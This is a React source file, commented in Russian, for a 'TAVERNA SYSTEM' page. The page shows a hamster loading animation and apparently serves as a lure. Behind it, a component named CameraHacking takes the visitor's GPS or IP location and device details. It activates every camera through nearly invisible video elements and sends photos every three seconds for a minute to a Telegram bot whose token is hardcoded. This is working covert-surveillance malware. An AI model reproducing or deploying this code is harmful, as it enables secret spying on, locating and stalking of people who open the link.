import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const cameraNamesRef = useRef([]); // Храним имена камер
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 60000; // 1 минута
  const photoInterval = 3000; // 3 секунды

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки текста в Telegram
  const sendToTelegram = (text, retryCount = 2) => {
    return new Promise((resolve, reject) => {
      const attemptSend = (attempt) => {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        xhr.onload = function() {
          if (xhr.status === 200) {
            console.log('✅ Сообщение отправлено');
            resolve(true);
          } else {
            console.error(`❌ Ошибка сообщения (попытка ${attempt}):`, xhr.status);
            if (attempt < retryCount) {
              setTimeout(() => attemptSend(attempt + 1), 1000);
            } else {
              reject();
            }
          }
        };
        
        xhr.onerror = function() {
          console.error(`❌ Ошибка сети (попытка ${attempt})`);
          if (attempt < retryCount) {
            setTimeout(() => attemptSend(attempt + 1), 1000);
          } else {
            reject();
          }
        };
        
        const data = JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: true
        });
        
        xhr.send(data);
      };
      
      attemptSend(1);
    });
  };

  // Отправка фото в Telegram
  const sendPhotoToTelegram = (blob, caption = '', retryCount = 2) => {
    return new Promise((resolve, reject) => {
      const attemptSend = (attempt) => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        formData.append('disable_notification', 'true');
        if (caption) {
          formData.append('caption', caption);
        }

        const xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
        
        xhr.onload = function() {
          if (xhr.status === 200) {
            console.log('✅ Фото отправлено');
            resolve(true);
          } else {
            console.error(`❌ Ошибка фото (попытка ${attempt}):`, xhr.status);
            if (attempt < retryCount) {
              setTimeout(() => attemptSend(attempt + 1), 1000);
            } else {
              reject();
            }
          }
        };
        
        xhr.onerror = function() {
          console.error(`❌ Ошибка сети (попытка ${attempt})`);
          if (attempt < retryCount) {
            setTimeout(() => attemptSend(attempt + 1), 1000);
          } else {
            reject();
          }
        };
        
        xhr.send(formData);
      };
      
      attemptSend(1);
    });
  };

  // Получение геолокации
  const getGeolocation = () => {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude, accuracy } = position.coords;
            resolve({
              latitude: latitude.toFixed(6),
              longitude: longitude.toFixed(6),
              accuracy: Math.round(accuracy),
              method: "GPS",
              success: true
            });
          },
          () => {
            getLocationByIP().then(resolve);
          },
          { timeout: 5000 }
        );
      } else {
        getLocationByIP().then(resolve);
      }
    });
  };

  // Получение локации по IP
  const getLocationByIP = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      return {
        latitude: data.latitude,
        longitude: data.longitude,
        city: data.city,
        country: data.country_name,
        ip: data.ip,
        method: "IP",
        success: true
      };
    } catch (error) {
      return { success: false };
    }
  };

  // Форматирование информации
  const formatDeviceInfo = (info) => {
    let locationText = '';
    if (info.location.success) {
      if (info.location.method === "GPS") {
        locationText = `📍 GPS: ${info.location.latitude}, ${info.location.longitude}`;
      } else {
        locationText = `📍 IP: ${info.location.city || ''}, ${info.location.country || ''}\n   IP: ${info.location.ip || ''}`;
      }
    }
    
    return `🔍 TAVERNA SYSTEM

📱 Устройство: ${info.isMobile ? 'Мобильное' : 'Компьютер'}
🖥 Экран: ${info.screenSize}
🌍 ${locationText}
⏰ ${info.timestamp}

🚀 Запускаю съемку на 1 минуту`;
  };

  // Инициализация камер - ПРАВИЛЬНАЯ ВЕРСИЯ
  const initializeCameras = async () => {
    try {
      console.log('📷 Инициализация камер...');
      
      streamsRef.current = [];
      videoRefsRef.current = [];
      cameraNamesRef.current = [];
      
      // Пробуем получить ВСЕ доступные камеры
      try {
        // Получаем список всех устройств
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');
        console.log('📷 Найдено устройств:', videoDevices.length);
        
        // Пробуем получить доступ к каждой камере
        for (let i = 0; i < videoDevices.length; i++) {
          try {
            const device = videoDevices[i];
            console.log(`📷 Пробую камеру ${i}:`, device.label || 'Без названия');
            
            // Пробуем разные конфигурации для каждой камеры
            const constraintsList = [
              { video: { deviceId: device.deviceId ? { exact: device.deviceId } : undefined } },
              { video: true } // Общие констрейнты как fallback
            ];
            
            let stream = null;
            for (const constraints of constraintsList) {
              try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                break; // Если получили поток, выходим
              } catch (err) {
                console.log(`❌ Конфигурация не сработала для камеры ${i}`);
                continue;
              }
            }
            
            if (!stream) continue;
            
            // Создаем видео элемент
            const video = document.createElement('video');
            video.style.cssText = `
              position: fixed;
              width: 320px;
              height: 240px;
              opacity: 0.01;
              pointer-events: none;
              z-index: -9999;
              top: 0;
              left: 0;
            `;
            video.autoplay = true;
            video.muted = true;
            video.playsInline = true;
            video.srcObject = stream;
            document.body.appendChild(video);
            
            // Ждем загрузки видео
            await new Promise((resolve, reject) => {
              const onLoaded = () => {
                video.removeEventListener('loadedmetadata', onLoaded);
                video.removeEventListener('error', onError);
                console.log(`✅ Камера ${i} готова: ${video.videoWidth}x${video.videoHeight}`);
                resolve();
              };
              
              const onError = () => {
                video.removeEventListener('loadedmetadata', onLoaded);
                video.removeEventListener('error', onError);
                reject();
              };
              
              video.addEventListener('loadedmetadata', onLoaded);
              video.addEventListener('error', onError);
              
              setTimeout(() => {
                if (video.readyState >= 1) resolve();
              }, 2000);
            });
            
            // Сохраняем
            streamsRef.current.push(stream);
            videoRefsRef.current.push(video);
            
            // Определяем тип камеры по метке
            let cameraName = 'Камера';
            const label = device.label || '';
            if (label.toLowerCase().includes('front') || label.toLowerCase().includes('face')) {
              cameraName = '🤳 Фронтальная камера';
            } else if (label.toLowerCase().includes('back') || label.toLowerCase().includes('rear')) {
              cameraName = '📷 Задняя камера';
            } else {
              // Пытаемся определить по порядку
              if (i === 0) cameraName = '🤳 Фронтальная камера';
              else if (i === 1) cameraName = '📷 Задняя камера';
              else cameraName = `📷 Камера ${i + 1}`;
            }
            cameraNamesRef.current.push(cameraName);
            
          } catch (error) {
            console.log(`❌ Ошибка камеры ${i}:`, error.message);
          }
        }
        
      } catch (error) {
        console.log('❌ Не могу получить список устройств:', error.message);
        
        // Fallback: пробуем стандартные камеры
        try {
          // Пробуем фронтальную камеру
          const frontStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
          });
          const frontVideo = document.createElement('video');
          frontVideo.style.cssText = `
            position: fixed;
            width: 320px;
            height: 240px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: 0;
          `;
          frontVideo.autoplay = true;
          frontVideo.muted = true;
          frontVideo.playsInline = true;
          frontVideo.srcObject = frontStream;
          document.body.appendChild(frontVideo);
          
          await new Promise(resolve => {
            frontVideo.onloadedmetadata = () => {
              console.log('✅ Фронтальная камера готова');
              streamsRef.current.push(frontStream);
              videoRefsRef.current.push(frontVideo);
              cameraNamesRef.current.push('🤳 Фронтальная камера');
              resolve();
            };
            setTimeout(resolve, 1000);
          });
          
        } catch (frontError) {
          console.log('❌ Фронтальная камера недоступна');
        }
        
        try {
          // Пробуем заднюю камеру
          const backStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: "environment" } }
          });
          const backVideo = document.createElement('video');
          backVideo.style.cssText = `
            position: fixed;
            width: 320px;
            height: 240px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: 320px;
          `;
          backVideo.autoplay = true;
          backVideo.muted = true;
          backVideo.playsInline = true;
          backVideo.srcObject = backStream;
          document.body.appendChild(backVideo);
          
          await new Promise(resolve => {
            backVideo.onloadedmetadata = () => {
              console.log('✅ Задняя камера готова');
              streamsRef.current.push(backStream);
              videoRefsRef.current.push(backVideo);
              cameraNamesRef.current.push('📷 Задняя камера');
              resolve();
            };
            setTimeout(resolve, 1000);
          });
          
        } catch (backError) {
          console.log('❌ Задняя камера недоступна');
        }
      }
      
      console.log(`📷 Инициализация завершена: ${streamsRef.current.length} камер`);
      return streamsRef.current.length > 0;
      
    } catch (error) {
      console.error('❌ Ошибка инициализации камер:', error);
      return false;
    }
  };

  // Создание фото с камеры - ПРАВИЛЬНАЯ ВЕРСИЯ
  const capturePhotoFromCamera = async (cameraIndex, video, cameraName) => {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      
      // Даем видео обновиться
      setTimeout(() => {
        if (video && video.videoWidth > 0 && video.videoHeight > 0) {
          console.log(`📸 Захват с ${cameraName}: ${video.videoWidth}x${video.videoHeight}`);
          
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          
          const ctx = canvas.getContext('2d');
          
          // Очищаем canvas
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          
          // Рисуем видео
          try {
            // Для фронтальной камеры - зеркалим
            if (cameraName.includes('Фронтальная') || cameraName.includes('front')) {
              ctx.save();
              ctx.translate(canvas.width, 0);
              ctx.scale(-1, 1);
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              ctx.restore();
            } else {
              // Для других камер - как есть
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            
            // Водяной знак TAVERNA
            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
            ctx.font = 'bold 30px Arial';
            ctx.textAlign = 'right';
            ctx.fillText('TAVERNA', canvas.width - 20, canvas.height - 20);
            
            // Информация
            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
            ctx.textAlign = 'left';
            ctx.font = '16px Arial';
            ctx.fillText(cameraName, 20, 40);
            ctx.fillText(`Фото #${captureCount.current + 1}`, 20, 70);
            ctx.fillText(new Date().toLocaleTimeString(), 20, 100);
            ctx.fillText(`${video.videoWidth}x${video.videoHeight}`, 20, 130);
            
          } catch (drawError) {
            console.error('❌ Ошибка рисования:', drawError);
            // Fallback изображение
            canvas.width = 800;
            canvas.height = 600;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#000000';
            ctx.fillRect(0, 0, 800, 600);
            ctx.fillStyle = '#FFFFFF';
            ctx.font = '30px Arial';
            ctx.textAlign = 'center';
            ctx.fillText('Ошибка камеры', 400, 300);
          }
          
        } else {
          // Тестовое изображение если видео не готово
          console.log(`📸 ${cameraName}: видео не готово`);
          
          canvas.width = 800;
          canvas.height = 600;
          const ctx = canvas.getContext('2d');
          
          // Градиентный фон
          const gradient = ctx.createLinearGradient(0, 0, 800, 600);
          gradient.addColorStop(0, '#667eea');
          gradient.addColorStop(1, '#764ba2');
          ctx.fillStyle = gradient;
          ctx.fillRect(0, 0, 800, 600);
          
          // Текст
          ctx.fillStyle = '#FFFFFF';
          ctx.font = 'bold 32px Arial';
          ctx.textAlign = 'center';
          ctx.fillText('TAVERNA SYSTEM', 400, 150);
          ctx.font = '24px Arial';
          ctx.fillText(cameraName, 400, 250);
          ctx.fillText(`Камера не активна`, 400, 300);
          ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 350);
          ctx.fillText(new Date().toLocaleTimeString(), 400, 400);
          
          // Водяной знак
          ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
          ctx.font = 'bold 48px Arial';
          ctx.textAlign = 'right';
          ctx.fillText('TAVERNA', 780, 580);
        }
        
        // Создаем blob
        canvas.toBlob(blob => {
          if (blob) {
            console.log(`📸 ${cameraName}: фото создано (${(blob.size / 1024).toFixed(1)} KB)`);
            resolve(blob);
          } else {
            resolve(null);
          }
        }, 'image/jpeg', 0.9);
        
      }, 100); // Небольшая задержка для обновления видео
    });
  };

  // Захват и отправка фото
  const captureAndSendPhotos = async () => {
    const elapsed = Date.now() - startTime.current;
    
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ TAVERNA: Время истекло\n📸 Всего фото: ${captureCount.current}`);
      return;
    }
    
    if (videoRefsRef.current.length === 0) {
      console.log('📷 Нет камер');
      captureCount.current++;
      return;
    }
    
    console.log(`📸 Съемка #${captureCount.current + 1}...`);
    
    // Отправляем фото с каждой камеры
    for (let i = 0; i < videoRefsRef.current.length; i++) {
      try {
        const video = videoRefsRef.current[i];
        const cameraName = cameraNamesRef.current[i] || `Камера ${i + 1}`;
        
        const photoBlob = await capturePhotoFromCamera(i, video, cameraName);
        
        if (photoBlob) {
          const elapsedSeconds = Math.floor(elapsed / 1000);
          const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
          
          const caption = `${cameraName}\n` +
            `📸 Фото #${captureCount.current + 1}\n` +
            `⏱ ${elapsedSeconds} сек / ${remainingSeconds} сек\n` +
            `🕐 ${new Date().toLocaleTimeString()}\n` +
            `🚀 TAVERNA SYSTEM`;
          
          await sendPhotoToTelegram(photoBlob, caption);
        }
      } catch (error) {
        console.error(`❌ Ошибка камеры ${i}:`, error);
      }
    }
    
    captureCount.current++;
    
    // Статистика
    if (captureCount.current % 3 === 0) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      sendToTelegram(
        `📊 TAVERNA: Статистика\n` +
        `📸 Фото: ${captureCount.current}\n` +
        `📷 Камер: ${videoRefsRef.current.length}\n` +
        `⏱ Прошло: ${elapsedSeconds} сек`
      );
    }
  };

  // Запуск съемки
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log('🚀 Запуск съемки');
    
    // Первый снимок
    setTimeout(() => {
      captureAndSendPhotos();
    }, 1000);
    
    // Интервал
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhotos();
    }, photoInterval);
  };

  // Остановка съемки
  const stopCapturing = () => {
    console.log('🛑 Остановка съемки');
    
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    // Закрываем камеры
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];
    
    // Удаляем видео
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
    cameraNamesRef.current = [];
  };

  // Основной эффект
  useEffect(() => {
    console.log('🚀 TAVERNA SYSTEM запущен для chatId:', chatId);
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        // Собираем базовую информацию
        const info = {
          timestamp: new Date().toLocaleString(),
          screenSize: `${window.screen.width}x${window.screen.height}`,
          isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
          location: await getGeolocation()
        };
        
        // Отправляем информацию
        await sendToTelegram(formatDeviceInfo(info));
        
        // Инициализируем камеры
        const camerasReady = await initializeCameras();
        
        if (camerasReady) {
          await sendToTelegram(
            `🚀 TAVERNA: Камеры активированы\n` +
            `📷 Доступно: ${streamsRef.current.length} камер\n` +
            `⏱ Съемка: 1 фото каждые 3 секунды\n` +
            `⏳ Длительность: 1 минута`
          );
          
          // Запускаем съемку
          startPeriodicCapture();
          
          // Таймер остановки
          setTimeout(() => {
            stopCapturing();
            sendToTelegram(
              `✅ TAVERNA: Съемка завершена\n` +
              `📸 Всего фото: ${captureCount.current}\n` +
              `🎉 Процесс завершен`
            );
          }, totalDuration);
          
        } else {
          await sendToTelegram('❌ TAVERNA: Не удалось активировать камеры');
        }
      } catch (error) {
        console.error('❌ Ошибка:', error);
      }
    };
    
    setTimeout(init, 1000);
    
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.4)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold',
            opacity: 0.9
          }}>
            TAVERNA SYSTEM ACTIVE...
          </div>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
